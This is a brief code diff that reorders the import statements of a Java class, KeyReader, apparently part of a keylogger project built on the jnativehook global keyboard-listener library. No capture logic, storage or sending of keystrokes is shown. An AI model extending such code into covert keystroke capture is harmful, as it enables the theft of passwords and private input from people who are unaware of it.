@@ -1,14 +1,13 @@
 package com.mossad.keylogger.reader;
 
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
 import com.mmigdal.mossad.key.logger.library.KeyLoggerEntries;
-
-import static kisonar.platform.domain.BaseDefinitions.*;
 
 import java.util.ArrayList;
 import java.util.List;
 
-import org.jnativehook.keyboard.NativeKeyEvent;
-import org.jnativehook.keyboard.NativeKeyListener;
+import static kisonar.platform.domain.BaseDefinitions.SPACE;
 
 public class KeyReader implements NativeKeyListener {
 
